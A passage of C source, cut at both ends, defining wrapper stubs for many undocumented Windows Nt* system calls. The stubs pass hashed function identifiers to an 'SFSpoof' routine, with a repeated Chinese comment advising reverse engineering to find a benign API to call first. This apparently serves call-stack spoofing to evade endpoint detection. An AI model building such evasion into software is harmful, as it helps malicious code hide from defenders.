    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0B60EAE87;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetHighWaitLowEventPair(HANDLE EventPairHandle) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00049209F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetIRTimer(HANDLE TimerHandle, PLARGE_INTEGER DueTime) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DueTime;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D98CD318;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationDebugObject(HANDLE DebugObject, DEBUGOBJECTINFOCLASS InformationClass, PVOID Information, ULONG InformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)DebugObject;
    Params.param[2] = (DWORD_PTR)InformationClass;
    Params.param[3] = (DWORD_PTR)Information;
    Params.param[4] = (DWORD_PTR)InformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0FCDE0F92;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationEnlistment(HANDLE EnlistmentHandle, ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass, PVOID EnlistmentInformation, ULONG EnlistmentInformationLength) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)EnlistmentInformationClass;
    Params.param[3] = (DWORD_PTR)EnlistmentInformation;
    Params.param[4] = (DWORD_PTR)EnlistmentInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0B921BCB7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationJobObject(HANDLE JobHandle, JOBOBJECTINFOCLASS JobObjectInformationClass, PVOID JobObjectInformation, ULONG JobObjectInformationLength) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)JobObjectInformationClass;
    Params.param[3] = (DWORD_PTR)JobObjectInformation;
    Params.param[4] = (DWORD_PTR)JobObjectInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x082B9AA05;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationKey(HANDLE KeyHandle, KEY_SET_INFORMATION_CLASS KeySetInformationClass, PVOID KeySetInformation, ULONG KeySetInformationLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)KeySetInformationClass;
    Params.param[3] = (DWORD_PTR)KeySetInformation;
    Params.param[4] = (DWORD_PTR)KeySetInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x00396223D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationResourceManager(HANDLE ResourceManagerHandle, RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass, PVOID ResourceManagerInformation, ULONG ResourceManagerInformationLength) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)ResourceManagerInformationClass;
    Params.param[3] = (DWORD_PTR)ResourceManagerInformation;
    Params.param[4] = (DWORD_PTR)ResourceManagerInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0B3A6ED6D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationSymbolicLink(HANDLE Handle, ULONG Class, PVOID Buffer, ULONG BufferLength) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)Class;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)BufferLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x060FB6C62;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)TokenInformationClass;
    Params.param[3] = (DWORD_PTR)TokenInformation;
    Params.param[4] = (DWORD_PTR)TokenInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x031AD0D02;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationTransaction(HANDLE TransactionHandle, TRANSACTIONMANAGER_INFORMATION_CLASS TransactionInformationClass, PVOID TransactionInformation, ULONG TransactionInformationLength) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)TransactionInformationClass;
    Params.param[3] = (DWORD_PTR)TransactionInformation;
    Params.param[4] = (DWORD_PTR)TransactionInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x07EB97025;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationTransactionManager(HANDLE TransactionHandle, TRANSACTION_INFORMATION_CLASS TransactionInformationClass, PVOID TransactionInformation, ULONG TransactionInformationLength) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)TransactionInformationClass;
    Params.param[3] = (DWORD_PTR)TransactionInformation;
    Params.param[4] = (DWORD_PTR)TransactionInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x083B29512;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationVirtualMemory(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, DWORD_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)VmInformationClass;
    Params.param[3] = (DWORD_PTR)NumberOfEntries;
    Params.param[4] = (DWORD_PTR)VirtualAddresses;
    Params.param[5] = (DWORD_PTR)VmInformation;
    Params.param[6] = (DWORD_PTR)VmInformationLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0DD96C91B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationWorkerFactory(HANDLE WorkerFactoryHandle, WORKERFACTORYINFOCLASS WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = (DWORD_PTR)WorkerFactoryInformationClass;
    Params.param[3] = (DWORD_PTR)WorkerFactoryInformation;
    Params.param[4] = (DWORD_PTR)WorkerFactoryInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x081139A71;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetIntervalProfile(ULONG Interval, KPROFILE_SOURCE Source) {
    Params.param[1] = (DWORD_PTR)Interval;
    Params.param[2] = (DWORD_PTR)Source;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0429A5426;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetIoCompletion(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransfered) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)CompletionKey;
    Params.param[3] = (DWORD_PTR)IoStatusBlock;
    Params.param[4] = (DWORD_PTR)CompletionStatus;
    Params.param[5] = (DWORD_PTR)NumberOfBytesTransfered;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x04C946FC5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetIoCompletionEx(HANDLE IoCompletionHandle, HANDLE IoCompletionPacketHandle, PVOID KeyContext, PVOID ApcContext, NTSTATUS IoStatus, DWORD_PTR IoStatusInformation) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)IoCompletionPacketHandle;
    Params.param[3] = (DWORD_PTR)KeyContext;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatus;
    Params.param[6] = (DWORD_PTR)IoStatusInformation;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0A3517E35;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetLdtEntries(ULONG Selector0, ULONG Entry0Low, ULONG Entry0Hi, ULONG Selector1, ULONG Entry1Low, ULONG Entry1Hi) {
    Params.param[1] = (DWORD_PTR)Selector0;
    Params.param[2] = (DWORD_PTR)Entry0Low;
    Params.param[3] = (DWORD_PTR)Entry0Hi;
    Params.param[4] = (DWORD_PTR)Selector1;
    Params.param[5] = (DWORD_PTR)Entry1Low;
    Params.param[6] = (DWORD_PTR)Entry1Hi;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x006A2537D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetLowEventPair(HANDLE EventPairHandle) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x082D28C42;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetLowWaitHighEventPair(HANDLE EventPairHandle) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x010B43821;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetQuotaInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PFILE_USER_QUOTA_INFORMATION Buffer, ULONG Length) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0F0DB299A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSecurityObject(HANDLE ObjectHandle, SECURITY_INFORMATION SecurityInformationClass, PSECURITY_DESCRIPTOR DescriptorBuffer) {
    Params.param[1] = (DWORD_PTR)ObjectHandle;
    Params.param[2] = (DWORD_PTR)SecurityInformationClass;
    Params.param[3] = (DWORD_PTR)DescriptorBuffer;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0FC61040D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSystemEnvironmentValue(PUNICODE_STRING VariableName, PUNICODE_STRING Value) {
    Params.param[1] = (DWORD_PTR)VariableName;
    Params.param[2] = (DWORD_PTR)Value;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x03EAD211A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSystemEnvironmentValueEx(PUNICODE_STRING VariableName, LPGUID VendorGuid, PVOID Value, ULONG ValueLength, ULONG Attributes) {
    Params.param[1] = (DWORD_PTR)VariableName;
    Params.param[2] = (DWORD_PTR)VendorGuid;
    Params.param[3] = (DWORD_PTR)Value;
    Params.param[4] = (DWORD_PTR)ValueLength;
    Params.param[5] = (DWORD_PTR)Attributes;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x08FB6DB6A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength) {
    Params.param[1] = (DWORD_PTR)SystemInformationClass;
    Params.param[2] = (DWORD_PTR)SystemInformation;
    Params.param[3] = (DWORD_PTR)SystemInformationLength;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x034AA1FFF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSystemPowerState(POWER_ACTION SystemAction, SYSTEM_POWER_STATE MinSystemState, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)SystemAction;
    Params.param[2] = (DWORD_PTR)MinSystemState;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0E634067E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetSystemTime(PLARGE_INTEGER SystemTime, PLARGE_INTEGER PreviousTime) {
    Params.param[1] = (DWORD_PTR)SystemTime;
    Params.param[2] = (DWORD_PTR)PreviousTime;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0AA82A723;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetThreadExecutionState(EXECUTION_STATE ExecutionState, PEXECUTION_STATE PreviousExecutionState) {
    Params.param[1] = (DWORD_PTR)ExecutionState;
    Params.param[2] = (DWORD_PTR)PreviousExecutionState;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0523340BC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetTimer2(HANDLE TimerHandle, PLARGE_INTEGER DueTime, PLARGE_INTEGER Period, PT2_SET_PARAMETERS Parameters) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DueTime;
    Params.param[3] = (DWORD_PTR)Period;
    Params.param[4] = (DWORD_PTR)Parameters;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x00995C99B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetTimerEx(HANDLE TimerHandle, TIMER_SET_INFORMATION_CLASS TimerSetInformationClass, PVOID TimerSetInformation, ULONG TimerSetInformationLength) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)TimerSetInformationClass;
    Params.param[3] = (DWORD_PTR)TimerSetInformation;
    Params.param[4] = (DWORD_PTR)TimerSetInformationLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x08E9BD439;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetTimerResolution(ULONG DesiredResolution, BOOLEAN SetResolution, PULONG CurrentResolution) {
    Params.param[1] = (DWORD_PTR)DesiredResolution;
    Params.param[2] = (DWORD_PTR)SetResolution;
    Params.param[3] = (DWORD_PTR)CurrentResolution;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0DEB4DE27;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetUuidSeed(PUCHAR Seed) {
    Params.param[1] = (DWORD_PTR)Seed;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0A39DA930;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetVolumeInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileSystemInformation, ULONG Length, FSINFOCLASS FileSystemInformationClass) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)FileSystemInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)FileSystemInformationClass;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0DFC49515;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetWnfProcessNotificationEvent(HANDLE NotificationEvent) {
    Params.param[1] = (DWORD_PTR)NotificationEvent;
    Params.param[2] = 0;
